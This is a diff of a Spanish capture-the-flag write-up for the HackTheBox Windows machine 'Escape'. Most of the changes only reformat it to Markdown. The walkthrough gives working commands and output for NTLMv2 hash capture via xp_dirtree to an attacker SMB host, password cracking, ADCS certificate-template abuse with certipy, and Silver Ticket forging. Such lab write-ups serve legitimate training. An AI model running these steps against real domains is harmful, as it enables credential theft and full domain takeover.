@@ -1,20 +1,19 @@
 ---
-category: writeup
-platform: HackTheBox
-machine_name: Escape
-difficulty: Media
+categories: ["HackTheBox", "Medium", "Windows"]
 title: "Máquina Escape"
 description: "Resolución de la máquina Escape de HackTheBox"
-tags: ["SMB Enumeration", "SQL Server Abuse", "NTLMv2 Hash leak/cracking", "Log analysis", "ADCS Certificate templates", "Silver Ticket"]
+author: Vz0n
+tags: ["SMB", "SQL Server", "NTLMv2", "Log analysis", "ADCS", "Silver Ticket"]
+logo: '/assets/writeups/escape/logo.png'
 ---
 
 En esta máquina Windows encontraremos un recurso SMB con un PDF expuesto que nos da credenciales para acceder a una base de datos SQL Server, el usuario con el que nos conectaremos fue pensado para estar aislado de funciones peligrosas y otras bases de datos, pero se les olvidó restringir el acceso a una que nos permitirá obtener el hash NTLMv2 del usuario que corre el servicio, estando dentro del sistema como `sql_svc` encontraremos un log con una contraseña de otro usuario que tiene permisos para pedir plantillas de certificados para autenticación por PKINIT. Esto último nos permitirá tomar control total del sistema.
 
-<h2>ENUMERACIÓN</h2>
+## ENUMERACIÓN
 
 La máquina tiene los puertos típicos de un controlador de dominio, a excepción del HTTP, por lo que aquí no estaremos viendo nada web.
 
-{% highlight bash %}
+```bash
 # Nmap 7.93 scan initiated Mon Jun 19 17:07:19 2023 as: nmap -sS -Pn -n -p- --open -oN ports -vvv --min-rate 200 10.10.11.202
 Nmap scan report for 10.10.11.202
 Host is up, received user-set (0.18s latency).
@@ -45,11 +44,11 @@ PORT      STATE SERVICE          REASON
 
 Read data files from: /usr/bin/../share/nmap
 # Nmap done at Mon Jun 19 17:14:37 2023 -- 1 IP address (1 host up) scanned in 437.52 seconds
-{% endhighlight %}
+```
 
 Por SMB tenemos acceso anónimo a un recurso compartido llamado "Public".
 
-{% highlight bash %}
+```bash
 ❯ smbmap -u "guest" -H 10.10.11.202
 [+] IP: 10.10.11.202:445	Name: dc.sequel.htb       	Status: Authenticated
 	Disk                                                  	Permissions	Comment
@@ -60,13 +59,13 @@ Por SMB tenemos acceso anónimo a un recurso compartido llamado "Public".
 	NETLOGON                                          	NO ACCESS	Logon server share 
 	Public                                            	READ ONLY	
 	SYSVOL                                            	NO ACCESS	Logon server share 
-{% endhighlight %}
+```
 
 El dominio es "sequel.htb", y parece que el nombre de la máquina es "dc"; por lo que antes de continuar no te olvides de agregar dicho dominio a tu archivo de hosts.
 
 Continuando con los recursos, Public tiene un archivo PDF.
 
-{% highlight bash %}
+```bash
 ❯ smbmap -r Public -u "guest" -H 10.10.11.202
 [+] IP: 10.10.11.202:445	Name: dc.sequel.htb       	Status: Authenticated
 	Disk                                                  	Permissions	Comment
@@ -76,15 +75,15 @@ Continuando con los recursos, Public tiene un archivo PDF.
 	dr--r--r--                0 Sat Nov 19 07:51:25 2022	.
 	dr--r--r--                0 Sat Nov 19 07:51:25 2022	..
 	fr--r--r--            49551 Sat Nov 19 07:51:25 2022	SQL Server Procedures.pdf
-{% endhighlight %}
+```
 
 Descárgandolo, vemos que es un documento que nos dice que esta empresa ha tenido problemas últimamente con sus instancias de SQL Server (en parte por según, Ryan), por lo que Tom pensó que sería buena idea escribir un procedimiento en como acceder y probar cualquier cambio en la base de datos en caso de incidencias o que los Juniors no tengan a sus Seniors. Aclaran que esto no será hecho en el servidor de producción y que Tom cuando vuelva de vacaciones removerá la instancia.
 
-{% highlight bash %}
+```bash
 ❯ smbmap --download "Public/SQL Server Procedures.pdf" -u "guest" -H 10.10.11.202
 [+] Starting download: Public\SQL Server Procedures.pdf (49551 bytes)
 [+] File output to: /home/vzon/Documentos/targets/escape/10.10.11.202-Public_SQL Server Procedures.pdf
-{% endhighlight %}
+```
 
 ![Document](/assets/writeups/escape/1.png)
 
@@ -96,7 +95,7 @@ En la segunda página del documento se nos comenta que si somos recién contrata
 
 Si probamos a entrar con estas credenciales al SQL Server, podremos hacerlo sin problemas.
 
-{% highlight bash %}
+```bash
 ❯ mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
 Impacket v0.10.1.dev1+20230616.115447.d1f16d8e - Copyright 2022 Fortra
 
@@ -109,11 +108,11 @@ Impacket v0.10.1.dev1+20230616.115447.d1f16d8e - Copyright 2022 Fortra
 [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
 [!] Press help for extra shell commands
 SQL (PublicUser  guest@master)>
-{% endhighlight %}
+```
 
 Pero no parece tener mucho...
 
-{% highlight bash %}
+```bash
 SQL (PublicUser  guest@master)> SELECT name FROM sys.databases;
 name     
 ------   
@@ -135,29 +134,29 @@ spt_fallback_dev
 spt_fallback_usg   
 
 spt_monitor        
-{% endhighlight %}
+```
 
 A ver que hacemos con esto.
 
-<h2>INTRUSIÓN</h2>
+## INTRUSIÓN
 
 Buscando por comandos que no deberíamos poder usar encontramos el `xp_dirtree`
 
-{% highlight bash %}
+```bash
 SQL (PublicUser  guest@master)> xp_dirtree
 subdirectory   depth   file   
 ------------   -----   ----   
-{% endhighlight %}
+```
 
 Con esto podemos ver archivos de la máquina, asi como ver recursos SMB externos, y un recurso SMB externo al ser cargado mediante esta forma, normalmente hace que el usuario se intente autenticar con sus credenciales automáticamente...
 
 Si nos creamos un recurso SMB e intentamos listarlo con el comando que encontramos, pues
 
-{% highlight bash %}
+```bash
 SQL (PublicUser  guest@master)> xp_dirtree \\10.10.16.4\uwu
-{% endhighlight %}
+```
 
-{% highlight bash %}
+```bash
 Impacket v0.10.1.dev1+20230616.115447.d1f16d8e - Copyright 2022 Fortra
 
 [*] Config file parsed
@@ -171,11 +170,11 @@ Impacket v0.10.1.dev1+20230616.115447.d1f16d8e - Copyright 2022 Fortra
 [*] User DC\sql_svc authenticated successfully
 [*] sql_svc::sequel:aaaaaaaaaaaaaaaa:6f6a4a7d7965cff1887f2a7835eec187:...
 [*] Closing down connection (10.10.11.202,51100)
-{% endhighlight %}
+```
 
 Estuvo algo sencillo pero bueno, este hash podemos intentar crackearlo y obtener la contraseña del usuario; por suerte no nos toma mucho hacerlo
 
-{% highlight bash %}
+```bash
 ❯ john -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
 Warning: detected hash type "netntlmv2", but the string is also recognized as "ntlmv2-opencl"
 Use the "--format=ntlmv2-opencl" option to force loading these as that type instead
@@ -187,20 +186,20 @@ REGGIE1234ronnie (sql_svc)
 1g 0:00:00:06 DONE (2023-06-19 18:07) 0.1512g/s 1618Kp/s 1618Kc/s 1618KC/s RENZOH..REDMAN36
 Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
 Session completed
-{% endhighlight %}
+```
 
 Viendo los permisos de este usuarios, ¡descubrimos que tiene acceso a WinRM!
 
-{% highlight bash %}
+```bash
 ❯ cme winrm 10.10.11.202 -u "sql_svc" -p "REGGIE1234ronnie"
 SMB         10.10.11.202    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
 HTTP        10.10.11.202    5985   DC               [*] http://10.10.11.202:5985/wsman
 WINRM       10.10.11.202    5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
-{% endhighlight %}
+```
 
 Vamos a entrar por WinRM y tomar la primera fl... eh, ¿cuál flag?
 
-{% highlight bash %}
+```bash
 ❯ evil-winrm -i 10.10.11.202 -u "sql_svc" -p "REGGIE1234ronnie"
 
 Evil-WinRM shell v3.4
@@ -211,13 +210,13 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\sql_svc> cd Desktop
 *Evil-WinRM* PS C:\Users\sql_svc\Desktop> ls -Force
 *Evil-WinRM* PS C:\Users\sql_svc\Desktop>
-{% endhighlight %}
+```
 
 uh, parece que este usuario solamente tiene la función de como lo dice su nombre... ser un servicio.
 
 Pero siendo un servicio deberíamos tener algún acceso especial, buscando por archivos encontramos lo que parece ser la raíz del SQL Server
 
-{% highlight powershell %}
+```powershell
 *Evil-WinRM* PS C:\> ls -Force
 
 
@@ -242,11 +241,11 @@ d-----         2/6/2023   7:21 AM                Windows
 
 
 *Evil-WinRM* PS C:\> cd SQLServer
-{% endhighlight %}
+```
 
 Tiene una carpeta de Logs con un archivo llamado `ERRORLOG.BAK` dentro, estos son registros obviamente, solo que en vez de ser precisamente errores parecen de la misma rutina del SQL Server
 
-{% highlight log %}
+```
 2022-11-18 13:43:05.96 Server      Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
 	Sep 24 2019 13:48:23
 	Copyright (C) 2019 Microsoft Corporation
@@ -274,29 +273,29 @@ Tiene una carpeta de Logs con un archivo llamado `ERRORLOG.BAK` dentro, estos so
 	-T 3659
 	-T 3610
 	-T 8015
-{% endhighlight %}
+```
 
 Husmeando por este archivo un poco, vemos mensajes de los spids (Creo Server Process IDs), pero terminando encontramos algo muy interesante; un intento fallido de autenticación por parte de Ryan.Cooper y, ¿Mosquito Nuclear 3?
 
-{% highlight log %}
+```
 2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
 2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
 2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
 2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
-{% endhighlight %}
+```
 
 No parece un nombre de usuario común, más bien una contraseña. Probándola con el usuario de arriba vemos que es la correcta y además también está en el grupo "Remote Management Users"...
 
-{% highlight bash %}
+```bash
 ❯ cme winrm 10.10.11.202 -u "ryan.cooper" -p "NuclearMosquito3"
 SMB         10.10.11.202    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
 HTTP        10.10.11.202    5985   DC               [*] http://10.10.11.202:5985/wsman
 WINRM       10.10.11.202    5985   DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 (Pwn3d!)
-{% endhighlight %}
+```
 
 Al autenticarnos como este usuario y ver el escritorio ya podremos ver la primera flag
 
-{% highlight bash %}
+```bash
 ❯ evil-winrm -i 10.10.11.202 -u "ryan.cooper" -p "NuclearMosquito3"
 
 Evil-WinRM shell v3.4
@@ -317,13 +316,13 @@ Mode                LastWriteTime         Length Name
 
 *Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> cat user.txt
 56019e02ce766dd1f5f302b461******
-{% endhighlight %}
+```
 
-<h2>ESCALADA DE PRIVILEGIOS</h2>
+## ESCALADA DE PRIVILEGIOS
 
 Viendo nuestro grupos nos percatamos de uno especial; el de servicio de certificados
 
-{% highlight powershell %}
+```powershell
 *Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> whoami /groups
 
 GROUP INFORMATION
@@ -341,13 +340,13 @@ NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandat
 NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
 NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
 Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
-{% endhighlight %}
+```
 
 Parece que esta máquina tiene instalado ADCS (Active Directory Certificate Services); buscando por internet formas de abusarlo encontraremos que si existen plantillas de certificados de autenticación mal configuradas podemos hacernos con el usuario Administrador. Estas plantillas normalmente son aquellas las cuales podemos "matricular" y permiten autenticarse como otros usuarios.
 
 Buscando por alguna encontramos una extraña:
 
-{% highlight powershell %}
+```powershell
 *Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> certutil -template
 ...
 Template[31]:
@@ -364,13 +363,13 @@ Template[31]:
     Allow Full Control	sequel\Administrator
     Allow Read	NT AUTHORITY\Authenticated Users
 ...
-{% endhighlight %}
+```
 
 Herramientas automatizadas como Certify y Certipy nos marcan esta plantilla como vulnerable, creo que no hay que explicar el por qué ya que se ve en los permisos que tiene y su nombre.
 
 Vamos a usar certipy para crear una petición de este certificado en nombre del usuario Administrador a ver si podemos usar el certificado que nos devuelva en el protocolo PKINIT de Kerberos. Primero debemos obtener el nombre del CA que los puedes hacer con certutil y luego simplemente colocar en el UPN del certificado el de Administrador
 
-{% highlight bash %}
+```bash
 # UPN: User Principle Name
 # CA: Certificate Authority o Autoridad de certificados
 ❯ certipy req -dc-ip 10.10.11.202 -u ryan.cooper@sequel.htb -p NuclearMosquito3 -template UserAuthentication -upn Administrator@sequel.htb -ca sequel-DC-CA
@@ -382,11 +381,11 @@ Certipy v4.5.1 - by Oliver Lyak (ly4k)
 [*] Got certificate with UPN 'Administrator@sequel.htb'
 [*] Certificate has no object SID
 [*] Saved certificate and private key to 'administrator.pfx'
-{% endhighlight %}
+```
 
 Bueno, nos dejó sin problemas al igual que intentar autenticarnos con este certificado...
 
-{% highlight bash %}
+```bash
 # Debemos sincronizar nuestro reloj con la hora del controlador de dominio ya que Kerberos no permite mucha diferencia en la hora al autenticarse.
 ❯ sudo ntpdate 10.10.11.202
 20 Jun 02:58:49 ntpdate[46666]: step time server 10.10.11.202 offset +28792.352734 sec
@@ -401,11 +400,11 @@ INFO:minikerberos:AS-REP encryption key (you might need this later):
 INFO:minikerberos:3d686342186021ea5459b8efef6127429236adb66679ee211980537c960d6e85
 2023-06-20 02:58:55,674 minikerberos INFO     Saved TGT to file
 INFO:minikerberos:Saved TGT to file
-{% endhighlight %}
+```
 
 Ahora usando este TGT podemos simplemente pedir un TGS para el servicio SMB y tomar la última flag.
 
-{% highlight bash %}
+```bash
 ❯ export KRB5CCNAME=a.ccache
 ❯ getST.py -spn cifs/dc.sequel.htb -k -no-pass sequel.htb/Administrator
 Impacket v0.10.1.dev1+20230616.115447.d1f16d8e - Copyright 2022 Fortra
@@ -435,15 +434,15 @@ C:\Users\Administrator\Desktop>dir
 
 C:\Users\Administrator\Desktop>type root.txt
 94cb2aecfaf2ac8d921aef7e0d******
-{% endhighlight %}
+```
 
-<h2>EXTRA</h2>
+## EXTRA
 
 ¿Si lo notaste no?, el usuario sql_svc al ser un usuario de servicio técnicamente podemos usar su hash NTLMv2 para forjar tickets Kerberos de quien sea en el servicio de SQL Server, a este ataque normalmente se le conoce como "Silver Ticket".
 
 Vamos a replicarlo, primero necesitamos el hash NT del usuario de servicio en cuestión que puedes obtener simplemente hasheando su contraseña codificada con UTF-16LE en MD4 y el SID del dominio, el cual podemos obtener fácilmente de varias formas.
 
-{% highlight powershell %}
+```powershell
 *Evil-WinRM* PS C:\Users\sql_svc\Documents> Get-ADDomain
 
 
@@ -477,11 +476,11 @@ RIDMaster                          : dc.sequel.htb
 SubordinateReferences              : {DC=ForestDnsZones,DC=sequel,DC=htb, DC=DomainDnsZones,DC=sequel,DC=htb, CN=Configuration,DC=sequel,DC=htb}
 SystemsContainer                   : CN=System,DC=sequel,DC=htb
 UsersContainer                     : CN=Users,DC=sequel,DC=htb
-{% endhighlight %}
+```
 
 Usaremos la herramienta de impacket `ticketer.py` para forjar un ticket del usuario Administrador para el servicio de SQL Server
 
-{% highlight bash %}
+```bash
 # Notar que puedes colocarle el SPN que quieras
  ticketer.py -nthash 6f6a4a7d7965cff1887f2a7835eec187 -domain-sid S-1-5-21-4078382237-1492182817-2568127209 -spn "IlovePen*s/dc.sequel.htb" -domain sequel.htb Administrator
 Impacket v0.10.1.dev1+20230616.115447.d1f16d8e - Copyright 2022 Fortra
@@ -498,11 +497,11 @@ Impacket v0.10.1.dev1+20230616.115447.d1f16d8e - Copyright 2022 Fortra
 [*] 	EncTicketPart
 [*] 	EncTGSRepPart
 [*] Saving ticket in Administrator.ccache
-{% endhighlight %}
+```
 
 y bueno, esto nos permite el acceso aún con lo que le hemos puesto de SPN
 
-{% highlight bash %}
+```bash
 ❯ export KRB5CCNAME=Administrator.ccache
 ❯ klist
 Ticket cache: FILE:Administrator.ccache
@@ -523,11 +522,11 @@ Impacket v0.10.1.dev1+20230616.115447.d1f16d8e - Copyright 2022 Fortra
 [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
 [!] Press help for extra shell commands
 SQL (sequel\Administrator  dbo@master)>
-{% endhighlight %}
+```
 
 Siendo Administrador aquí podemos habilitar el resto de Stored Procedures delicadas y hacer cositas como escalar privilegios a SYSTEM directamente desde aquí.
 
-{% highlight bash %}
+```bash
 SQL (sequel\Administrator  dbo@master)> sp_configure 'show advanced options',1
 [*] INFO(DC\SQLMOCK): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
 SQL (sequel\Administrator  dbo@master)> reconfigure
@@ -558,4 +557,4 @@ SeCreateGlobalPrivilege       Create global objects                     Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
 
 NULL     
-{% endhighlight %}
+```
